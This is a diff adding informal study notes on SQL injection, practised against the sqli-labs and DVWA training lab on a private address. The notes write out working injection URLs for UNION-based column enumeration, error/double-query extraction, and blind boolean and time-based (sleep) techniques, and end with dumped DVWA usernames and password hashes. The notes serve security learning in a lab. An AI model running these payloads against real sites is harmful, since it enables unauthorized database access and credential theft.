@@ -1,0 +1,226 @@
+Learn SQLi Query Fixing 
+
+1. identify sqli vulnerability 
+'
+"
+\
+
+2. balance the query 
+
+http://192.168.1.103/sqli-labs-master/Less-1/?id=1 {front end }
+
+select id ='id' where name ='xyz' {background}
+
+
+how to fix 
+
+http://192.168.1.103/sqli-labs-master/Less-1/?id=1'   --+
+
+select id ='1'    --+' where name ='xyz' {background}
+
+Less-2 
+
+in background 
+
+select id=1  --+where name =xyz
+
+how to fix query 
+
+http://192.168.1.103/sqli-labs-master/Less-2/?id=1   --+
+
+Less-3 
+
+in background 
+select id = ('1\') where name =('xyz')
+
+--------------------------------------------
+SQLI Through Get Based 
+
+Less-1 
+
+http://192.168.1.103/sqli-labs-master/Less-1/?id=1'   --+ {balanced query }
+
+1. find total no of vulnerable columns 
+
+order by 1{same page }
+
+order by 2 {same page }
+
+
+order by n {different page }
+
+there is n-1 columns are prsenet
+
+http://192.168.1.103/sqli-labs-master/Less-1/?id=1' order by 1  --+  
+
+2. find exact no of vulnerable columns out of these n-1 
+
+union all select 1,2,...n-1 
+
+example 
+
+union all select 1,2,3
+
+select id=-1' union all select 1,2,3  --+where name =xyz 
+
+
+executed - http://192.168.1.103/sqli-labs-master/Less-1/?id=-1' union all select 1,2,3 --+
+
+3. execute any datbase sqli query there 
+
+on that reflect no 
+
+example - database()
+
+version()
+
+user()
+
+executed - http://192.168.1.103/sqli-labs-master/Less-1/?id=-1' union all select 1,database(),3 --+
+
+http://192.168.1.103/sqli-labs-master/Less-1/?id=-1' union all select 1,database(),user() --+
+
+--------------------------------------------
+
+situtation you are getting error but you are not getting output of union sqli staement in that case there may error based sqli or may be double query based sqli 
+
+
+http://192.168.1.103/sqli-labs-master/Less-5/?id=-1'       --+
+
+
+error/double based sqli query -> hackbar->error/double->get database 
+
+-----------------------------------------
+Blind SQLI 
+
+blind boolien based sqli 
+
+and 1=1 {true }
+
+and 1=2 {false }
+
+and "a"="b"
+
+and database()="xyz"
+
+we can not assume the database 
+
+and substring(database(),1,1)="a"
+
+http://192.168.1.103/sqli-labs-master/Less-8/?id=1'    and substring(database(),1,1)="s"  --+ {true vale that menas first charcater of first databse is s}
+
+
+http://192.168.1.103/sqli-labs-master/Less-8/?id=1'    and substring(database(),2,1)="e"  --+ {true second character of first database is e}
+
+blind time based sqli 
+
+' and sleep(10) --+
+" and sleep(10) --+
+
+') and sleep(10) --+
+
+how to extract database for blind time based sqli 
+
+' and sleep(10) and 1=1 --+
+
+i gave http://192.168.1.103/sqli-labs-master/Less-9/?id=1'   and sleep(10) and database()="security" --+ its sleeping thats means 
+
+http://192.168.1.103/sqli-labs-master/Less-9/?id=1'   and sleep(10) and database()="xyz" --+ {its not sleeping for 10 sec }
+-----------------------------------------
+
+Exploitation of GET Based sqli 
+
+1. Database List - 
+
+hackbar->union->database->group_concat 
+
+information_schema
+challenges
+dvwa
+metasploit
+mysql
+owasp10
+security
+tikiwiki
+tikiwiki195
+
+2.find tables of a database -dvwa 
+
+hackbar->union->tables->group_concat 
+
+guestbook
+users
+
+3. find columns of a table - guestbook 
+
+comment_id
+comment
+name
+
+
+4. data of that columns 
+
+name,comment 
+
+hackbar->union->data->group_concat
+
+name,"<------>",comment,"---->",third
+
+
+Error Based Double Query Exploitaion 
+
+what about other database 
+
+for if want to fetch remaining database 
+
+you have to increase first value of first limit 
+
+LIMIT+1,1 - challenges 
+
+LIMIT+2,1 - dvwa 
+
+LIMIT 3,1 - metasploit 
+
+tables 
+
+default tables 
+LIMIT+0,1 -  guestbook 
+
+LIMIT+1,1 - users 
+
+
+LIMIT+2,1 -- you are not getting aything that means there is only two tables 
+
+
+columns for double query based 
+
+LIMIT+0,1   - user_id 
+
+LIMIT+1,1.   ---  first_name 
+
+LIMIT+2,1)). --- last_name 
+
+LIMIT+3,1)). ---- user 
+
+LIMIT+4,1)).  --- password 
+
+LIMIT+5,1)). -- avatar 
+
+LIMIT+0,1)). ---- nothing 
+
+Data of these columns 
+user        password 
+admin		5f4dcc3b5aa765d61d8327deb882cf99
+gordonb		e99a18c428cb38d5f260853678922e03
+1337 		8d3533d75ae2c3966d7e0d4fcc69216b
+pablo
+
+
+
+
+
+
+
+
+
+
